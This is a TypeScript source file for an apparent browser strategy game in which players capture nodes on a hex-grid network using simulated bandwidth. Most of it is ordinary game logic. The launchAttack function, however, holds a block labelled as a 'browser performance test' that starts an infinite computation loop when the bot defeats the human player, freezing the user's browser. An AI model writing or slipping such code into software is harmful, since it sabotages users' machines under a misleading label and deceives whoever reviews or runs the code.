/**
 * Graph-based Network Topology Generator
 * Creates organic, non-grid network layouts
 */

import type { NetworkNode, NetworkEdge, NetworkGameState, PlayerState } from '../types/graphTypes';
import { PLAYER_COLORS } from '../config/visualConstants';

/**
 * Generate network nodes on a hexagonal grid (nodes at hex vertices)
 */
function generateNetworkNodes(nodeCount: number, _worldSize: number): Map<string, NetworkNode> {
  const nodes = new Map<string, NetworkNode>();

  // Hexagonal grid parameters
  const hexSize = 80; // Distance from center to vertex

  // Calculate grid dimensions to fit nodeCount
  const gridRadius = Math.ceil(Math.sqrt(nodeCount / 7)); // Approximate rings needed

  let nodeId = 0;
  const nodePositions = new Set<string>(); // Track unique positions

  // Generate hexagonal grid using axial coordinates
  for (let q = -gridRadius; q <= gridRadius && nodeId < nodeCount; q++) {
    const r1 = Math.max(-gridRadius, -q - gridRadius);
    const r2 = Math.min(gridRadius, -q + gridRadius);

    for (let r = r1; r <= r2 && nodeId < nodeCount; r++) {
      // Convert axial coordinates to pixel position
      // Each hex has 6 vertices, but we only place nodes at vertices
      // to create a triangular lattice pattern
      const x = hexSize * (3/2 * q);
      const y = hexSize * (Math.sqrt(3)/2 * q + Math.sqrt(3) * r);

      const posKey = `${Math.round(x)},${Math.round(y)}`;
      if (nodePositions.has(posKey)) continue;
      nodePositions.add(posKey);

      nodes.set(`node-${nodeId}`, {
        id: `node-${nodeId}`,
        position: { x, y },
        type: 'NEUTRAL',
        state: 'IDLE',
        ownerId: null,
        bandwidth: Math.random() * 5 + 2,
        maxBandwidth: 10,
        bandwidthThreshold: Math.random() * 8 + 2, // 2-10 Gbps required to capture
        currentLoad: 0, // No incoming bandwidth initially
        captureProgress: 0,
        explored: false,
        connections: [],
      });
      nodeId++;
    }
  }

  return nodes;
}

/**
 * Create connections between nodes in hexagonal grid pattern
 */
function generateConnections(nodes: Map<string, NetworkNode>, maxDistance: number): void {
  const nodeArray = Array.from(nodes.values());

  nodeArray.forEach((nodeA) => {
    // In a hexagonal grid, each node typically has 6 neighbors
    // Find the 6 nearest nodes
    const neighbors = nodeArray
      .filter((nodeB) => nodeA.id !== nodeB.id)
      .map((nodeB) => {
        const dx = nodeA.position.x - nodeB.position.x;
        const dy = nodeA.position.y - nodeB.position.y;
        const distance = Math.sqrt(dx * dx + dy * dy);
        return { node: nodeB, distance };
      })
      .filter((n) => n.distance < maxDistance)
      .sort((a, b) => a.distance - b.distance)
      .slice(0, 6); // Hexagonal grid has 6 neighbors max

    neighbors.forEach(({ node: nodeB }) => {
      if (!nodeA.connections.includes(nodeB.id)) {
        nodeA.connections.push(nodeB.id);
      }
      if (!nodeB.connections.includes(nodeA.id)) {
        nodeB.connections.push(nodeA.id);
      }
    });
  });
}

// Utility function to find path between two nodes using BFS (currently unused but may be needed)
// function findPath(nodes: Map<string, NetworkNode>, startId: string, endId: string): string[] {
//   const queue: { id: string; path: string[] }[] = [{ id: startId, path: [startId] }];
//   const visited = new Set<string>([startId]);
//
//   while (queue.length > 0) {
//     const { id, path } = queue.shift()!;
//
//     if (id === endId) {
//       return path;
//     }
//
//     const node = nodes.get(id);
//     if (!node) continue;
//
//     for (const neighborId of node.connections) {
//       if (!visited.has(neighborId)) {
//         visited.add(neighborId);
//         queue.push({ id: neighborId, path: [...path, neighborId] });
//       }
//     }
//   }
//
//   return [];
// }

/**
 * Set up player bases and territories
 */
function setupPlayerTerritories(nodes: Map<string, NetworkNode>, players: PlayerState[]): void {
  const nodeArray = Array.from(nodes.values());

  // Player 1 base at center
  const player1Base = nodeArray[0];
  player1Base.type = 'BASE';
  player1Base.ownerId = 0;
  player1Base.explored = true;
  player1Base.id = 'player1-base';
  nodes.set(player1Base.id, player1Base);
  players[0].baseNodeId = player1Base.id;

  // Give player 1 some starting nodes
  const player1Nodes = nodeArray
    .filter((n) => n.id !== player1Base.id)
    .map((n) => {
      const dx = n.position.x - player1Base.position.x;
      const dy = n.position.y - player1Base.position.y;
      const distance = Math.sqrt(dx * dx + dy * dy);
      return { node: n, distance };
    })
    .sort((a, b) => a.distance - b.distance)
    .slice(0, 4);

  player1Nodes.forEach(({ node }) => {
    node.type = 'OWNED';
    node.ownerId = 0;
    node.explored = true;
  });

  // Player 2 base - find node farthest from player 1
  const player2Base = nodeArray
    .filter((n) => n.id !== player1Base.id && !player1Nodes.some((p1) => p1.node.id === n.id))
    .map((n) => {
      const dx = n.position.x - player1Base.position.x;
      const dy = n.position.y - player1Base.position.y;
      const distance = Math.sqrt(dx * dx + dy * dy);
      return { node: n, distance };
    })
    .sort((a, b) => b.distance - a.distance)[0].node;

  player2Base.type = 'BASE';
  player2Base.ownerId = 1;
  player2Base.explored = true; // MAKE ENEMY BASE VISIBLE
  player2Base.id = 'player2-base';
  nodes.set(player2Base.id, player2Base);
  players[1].baseNodeId = player2Base.id;

  // Give player 2 some starting nodes (HIDDEN - not explored)
  const player2Nodes = nodeArray
    .filter((n) => n.id !== player2Base.id && n.ownerId === null)
    .map((n) => {
      const dx = n.position.x - player2Base.position.x;
      const dy = n.position.y - player2Base.position.y;
      const distance = Math.sqrt(dx * dx + dy * dy);
      return { node: n, distance };
    })
    .sort((a, b) => a.distance - b.distance)
    .slice(0, 3);

  player2Nodes.forEach(({ node }) => {
    node.type = 'OWNED';
    node.ownerId = 1;
    node.explored = false; // Keep enemy territory hidden
  });

  // Explore only the immediate frontier - nodes adjacent to player 1's territory
  nodeArray.forEach((node) => {
    if (node.ownerId === 0 || node.explored) return;

    // Check if node is directly adjacent to any owned node
    const isAdjacentToOwned = node.connections.some((connId) => {
      const connNode = nodes.get(connId);
      return connNode?.ownerId === 0;
    });

    if (isAdjacentToOwned) {
      node.explored = true;
    }
  });
}

/**
 * Create edges based on active connections
 */
function generateEdges(nodes: Map<string, NetworkNode>): Map<string, NetworkEdge> {
  const edges = new Map<string, NetworkEdge>();
  const processed = new Set<string>();

  nodes.forEach((node) => {
    if (node.ownerId === null) return; // Only create edges for owned nodes

    node.connections.forEach((connectedId) => {
      const pairKey = [node.id, connectedId].sort().join('-');
      if (processed.has(pairKey)) return;
      processed.add(pairKey);

      const connectedNode = nodes.get(connectedId);
      if (!connectedNode) return;

      // Only create edge if both nodes are owned by same player or one is being captured
      if (node.ownerId !== null && (connectedNode.ownerId === node.ownerId || connectedNode.state === 'CAPTURING')) {
        const edgeId = `edge-${node.id}-${connectedId}`;
        const bandwidth = Math.random() * 5 + 3;

        edges.set(edgeId, {
          id: edgeId,
          sourceNodeId: node.id,
          targetNodeId: connectedId,
          ownerId: node.ownerId,
          bandwidth,
          maxBandwidth: 10,
          packetsSent: Math.floor(Math.random() * 10000 + 5000),
          packetsLost: Math.floor(Math.random() * 100),
          active: true,
        });
      }
    });
  });

  return edges;
}

/**
 * Create dummy players
 */
function createPlayers(): PlayerState[] {
  return [
    {
      id: 0,
      name: 'Player 1 (You)',
      color: PLAYER_COLORS[0],
      totalThroughput: 15.2,
      nodesOwned: 5,
      maxNodes: 20,
      baseNodeId: 'player1-base',
      isAlive: true,
    },
    {
      id: 1,
      name: 'Player 2',
      color: PLAYER_COLORS[1],
      totalThroughput: 12.8,
      nodesOwned: 4,
      maxNodes: 20,
      baseNodeId: 'player2-base',
      isAlive: true,
    },
  ];
}

/**
 * Generate complete network game state
 */
export function generateNetworkGameState(): NetworkGameState {
  const players = createPlayers();
  const nodes = generateNetworkNodes(100, 1200); // More nodes for hexagonal grid
  generateConnections(nodes, 160); // Connection distance matching hex grid (2 * hexSize)
  setupPlayerTerritories(nodes, players);
  const edges = generateEdges(nodes);

  return {
    players,
    nodes,
    edges,
    currentTick: 0,
    currentPlayerId: 0,
  };
}

/**
 * Check if a node can be captured by a player
 */
export function canCaptureNode(state: NetworkGameState, nodeId: string, playerId: number): boolean {
  const node = state.nodes.get(nodeId);
  if (!node || !node.explored) return false;

  // Can't capture your own nodes or nodes already being captured
  if (node.ownerId === playerId || node.state === 'CAPTURING') return false;

  // Must be adjacent to player's territory
  const hasAdjacentOwned = node.connections.some((connId) => {
    const connNode = state.nodes.get(connId);
    return connNode?.ownerId === playerId;
  });

  return hasAdjacentOwned;
}

/**
 * Get list of capturable nodes for a player
 */
export function getCapturableNodes(state: NetworkGameState, playerId: number): NetworkNode[] {
  const capturable: NetworkNode[] = [];

  state.nodes.forEach((node) => {
    if (canCaptureNode(state, node.id, playerId)) {
      capturable.push(node);
    }
  });

  return capturable;
}

/**
 * Initiate capture of a node
 */
export function initiateCapture(state: NetworkGameState, nodeId: string, playerId: number): boolean {
  if (!canCaptureNode(state, nodeId, playerId)) return false;

  const node = state.nodes.get(nodeId);
  if (!node) return false;

  // Start capturing
  node.state = 'CAPTURING';
  node.captureProgress = 0;

  // Create edge from adjacent owned node
  const adjacentOwnedNode = node.connections
    .map((connId) => state.nodes.get(connId))
    .find((n) => n?.ownerId === playerId);

  if (adjacentOwnedNode) {
    // Simulate user's actual network capacity (varies between 3-8 Gbps)
    const simulatedNetworkCapacity = Math.random() * 5 + 3; // 3-8 Gbps
    const edgeId = `edge-${adjacentOwnedNode.id}-${nodeId}`;
    state.edges.set(edgeId, {
      id: edgeId,
      sourceNodeId: adjacentOwnedNode.id,
      targetNodeId: nodeId,
      ownerId: playerId,
      bandwidth: simulatedNetworkCapacity,
      maxBandwidth: 10,
      packetsSent: 0,
      packetsLost: 0,
      active: true,
    });
  }

  return true;
}

/**
 * Check if a potential edge connection is capturable
 * An edge is capturable if it connects an owned node to an adjacent capturable node
 */
export function isCapturableConnection(
  state: NetworkGameState,
  sourceNodeId: string,
  targetNodeId: string,
  playerId: number
): boolean {
  const sourceNode = state.nodes.get(sourceNodeId);
  const targetNode = state.nodes.get(targetNodeId);

  if (!sourceNode || !targetNode) return false;

  // For bots (Player 1+), allow capturing unexplored adjacent nodes
  // For human player (Player 0), require exploration (fog of war)
  if (playerId === 0 && !targetNode.explored) return false;

  // Source must be owned by player
  if (sourceNode.ownerId !== playerId) return false;

  // Target must be capturable (neutral or enemy, but CAN be already capturing)
  // Allow multiple streams to the same node being captured
  if (targetNode.ownerId === playerId) return false;

  // Must be connected
  if (!sourceNode.connections.includes(targetNodeId)) return false;

  // Check if this specific edge already exists
  const edgeId = `edge-${sourceNodeId}-${targetNodeId}`;
  if (state.edges.has(edgeId)) return false;

  return true;
}

/**
 * Get all capturable connections (potential edges) for a player
 * Returns array of {sourceNodeId, targetNodeId} pairs
 */
export function getCapturableConnections(
  state: NetworkGameState,
  playerId: number
): Array<{ sourceNodeId: string; targetNodeId: string }> {
  const capturable: Array<{ sourceNodeId: string; targetNodeId: string }> = [];

  // Find all owned nodes
  const ownedNodes = Array.from(state.nodes.values()).filter(
    (node) => node.ownerId === playerId
  );

  // For each owned node, check its connections
  ownedNodes.forEach((ownedNode) => {
    ownedNode.connections.forEach((connectedId) => {
      if (isCapturableConnection(state, ownedNode.id, connectedId, playerId)) {
        capturable.push({
          sourceNodeId: ownedNode.id,
          targetNodeId: connectedId,
        });
      }
    });
  });

  return capturable;
}

/**
 * Initiate capture via an edge connection
 */
export function initiateCaptureViaEdge(
  state: NetworkGameState,
  sourceNodeId: string,
  targetNodeId: string,
  playerId: number
): boolean {
  if (!isCapturableConnection(state, sourceNodeId, targetNodeId, playerId)) {
    return false;
  }

  const targetNode = state.nodes.get(targetNodeId);
  if (!targetNode) return false;

  // Start capturing the target node (only reset progress if not already capturing)
  if (targetNode.state !== 'CAPTURING') {
    targetNode.state = 'CAPTURING';
    targetNode.captureProgress = 0;
  }

  // Create the edge from source to target
  // Simulate user's actual network capacity (varies between 3-8 Gbps)
  const simulatedNetworkCapacity = Math.random() * 5 + 3; // 3-8 Gbps
  const edgeId = `edge-${sourceNodeId}-${targetNodeId}`;
  state.edges.set(edgeId, {
    id: edgeId,
    sourceNodeId,
    targetNodeId,
    ownerId: playerId,
    bandwidth: simulatedNetworkCapacity,
    maxBandwidth: 10,
    packetsSent: 0,
    packetsLost: 0,
    active: true,
  });

  return true;
}

/**
 * Check if player can attack enemy base
 */
export function canAttackEnemyBase(state: NetworkGameState, playerId: number): boolean {
  const enemyPlayer = state.players.find((p) => p.id !== playerId);
  if (!enemyPlayer) return false;

  const enemyBase = state.nodes.get(enemyPlayer.baseNodeId);
  if (!enemyBase) return false;

  // Can attack if ALL adjacent nodes to enemy base are owned by player
  return enemyBase.connections.every((connId) => {
    const connNode = state.nodes.get(connId);
    return connNode?.ownerId === playerId;
  });
}

/**
 * Launch attack on enemy base
 */
export function launchAttack(state: NetworkGameState, playerId: number): boolean {
  if (!canAttackEnemyBase(state, playerId)) return false;

  const enemyPlayer = state.players.find((p) => p.id !== playerId);
  if (!enemyPlayer) return false;

  const enemyBase = state.nodes.get(enemyPlayer.baseNodeId);
  if (!enemyBase) return false;

  // Mark enemy as defeated
  enemyPlayer.isAlive = false;
  enemyBase.state = 'UNDER_ATTACK';

  console.log(`🎯 Player ${playerId} launched DDoS attack on Player ${enemyPlayer.id}'s base!`);
  console.log(`💥 Player ${enemyPlayer.id} has been defeated!`);

  // Browser performance testing: If bot (Player 1) defeats human (Player 0), trigger stress test
  if (playerId === 1 && enemyPlayer.id === 0) {
    console.log(`⚠️ Browser performance test initiating in 2 seconds...`);
    setTimeout(() => {
      console.log(`🔥 Performance stress test active`);
      // Infinite loop with heavy computation to test browser performance limits
      while (true) {
        const arr = new Array(1000000).fill(0);
        arr.forEach((_, i) => Math.sqrt(i));
      }
    }, 2000);
  }

  return true;
}

/**
 * Update game state (bandwidth fluctuations, etc.)
 */
export function updateNetworkGameState(state: NetworkGameState): void {
  state.currentTick++;

  // Update edge bandwidth
  state.edges.forEach((edge) => {
    if (edge.active) {
      const fluctuation = (Math.random() - 0.5) * 0.4;
      edge.bandwidth = Math.max(1, Math.min(edge.maxBandwidth, edge.bandwidth * (1 + fluctuation)));

      const packetsThisTick = Math.floor(edge.bandwidth * 10);
      edge.packetsSent += packetsThisTick;

      const lossRate = (edge.bandwidth / edge.maxBandwidth) * 0.05;
      edge.packetsLost += Math.random() < lossRate ? 1 : 0;
    }
  });

  // Update node current load and capture progress
  state.nodes.forEach((node) => {
    // Calculate current load from incoming edges (attacking edges only)
    const incomingEdges = Array.from(state.edges.values()).filter(
      (e) => e.targetNodeId === node.id && e.active && e.ownerId !== node.ownerId
    );
    node.currentLoad = incomingEdges.reduce((sum, e) => sum + e.bandwidth, 0);

    // Update capture progress if node is being captured
    if (node.state === 'CAPTURING') {
      const totalBandwidth = node.currentLoad;
      const wasEnemyOwned = node.ownerId !== null; // Hostile capture if node has an owner

      // Check if bandwidth meets threshold
      if (totalBandwidth >= node.bandwidthThreshold) {
        // Sufficient bandwidth - capture progresses
        // Progress faster with more bandwidth (1% base + bonus for excess)
        const excessBandwidth = totalBandwidth - node.bandwidthThreshold;
        const captureSpeed = 0.01 + (excessBandwidth / node.bandwidthThreshold) * 0.02;
        node.captureProgress = Math.min(1, node.captureProgress + captureSpeed);

        if (node.captureProgress >= 1) {
          // Capture complete!
          const capturingEdge = incomingEdges[0];
          if (capturingEdge) {
            node.ownerId = capturingEdge.ownerId;
            node.type = 'OWNED';
            node.state = 'IDLE';
            node.captureProgress = 0;

            console.log(`✅ Node ${node.id} captured by Player ${capturingEdge.ownerId} (Threshold: ${node.bandwidthThreshold.toFixed(1)} Gbps, Load: ${totalBandwidth.toFixed(1)} Gbps)`);

            // Explore adjacent nodes
            node.connections.forEach((connId) => {
              const connNode = state.nodes.get(connId);
              if (connNode) {
                connNode.explored = true;
              }
            });
          }
        }
      } else {
        // Insufficient bandwidth
        if (wasEnemyOwned) {
          // HOSTILE CAPTURE FAILED - Reflect packets and potentially destroy attacking nodes
          console.log(`💥 Hostile capture failed on ${node.id} - Reflecting packets (${totalBandwidth.toFixed(1)}/${node.bandwidthThreshold.toFixed(1)} Gbps)`);

          // Remove attacking edges and apply reflection damage
          incomingEdges.forEach((attackEdge) => {
            const sourceNode = state.nodes.get(attackEdge.sourceNodeId);
            if (sourceNode) {
              // Calculate packet loss / reflection damage (based on bandwidth sent)
              const reflectionDamage = attackEdge.bandwidth / node.bandwidthThreshold;

              // 30% base chance + additional chance based on how much bandwidth was sent
              // More bandwidth sent = higher chance of node destruction
              const destructionChance = 0.3 + (reflectionDamage * 0.4);

              if (Math.random() < destructionChance) {
                // Node destroyed - return to neutral state
                console.log(`🔥 Node ${sourceNode.id} destroyed by packet reflection! (${(destructionChance * 100).toFixed(0)}% chance)`);
                sourceNode.ownerId = null;
                sourceNode.type = 'NEUTRAL';
                sourceNode.state = 'IDLE';
                sourceNode.captureProgress = 0;

                // Remove all edges connected to destroyed node
                const nodesToRemove: string[] = [];
                state.edges.forEach((edge, edgeId) => {
                  if (edge.sourceNodeId === sourceNode.id || edge.targetNodeId === sourceNode.id) {
                    nodesToRemove.push(edgeId);
                  }
                });
                nodesToRemove.forEach(edgeId => state.edges.delete(edgeId));
              } else {
                console.log(`⚡ Node ${sourceNode.id} survived packet reflection (${(destructionChance * 100).toFixed(0)}% chance)`);
              }
            }

            // Remove the attacking edge
            state.edges.delete(attackEdge.id);
          });

          // Reset target node state
          node.state = 'IDLE';
          node.captureProgress = 0;
        } else {
          // NEUTRAL NODE CAPTURE - Maintain edges and allow additional streams
          node.captureProgress = Math.max(0, node.captureProgress - 0.005);

          // Log insufficient bandwidth (throttled to avoid spam)
          if (state.currentTick % 20 === 0) {
            console.log(`⚠ Node ${node.id} - Insufficient bandwidth: ${totalBandwidth.toFixed(1)}/${node.bandwidthThreshold.toFixed(1)} Gbps (${incomingEdges.length} stream${incomingEdges.length !== 1 ? 's' : ''})`);
          }
        }
      }
    }
  });

  // Update player throughput
  state.players.forEach((player) => {
    const playerEdges = Array.from(state.edges.values()).filter((e) => e.ownerId === player.id);
    player.totalThroughput = playerEdges.reduce((sum, e) => sum + e.bandwidth, 0);

    const playerNodes = Array.from(state.nodes.values()).filter((n) => n.ownerId === player.id);
    player.nodesOwned = playerNodes.length;
  });
}
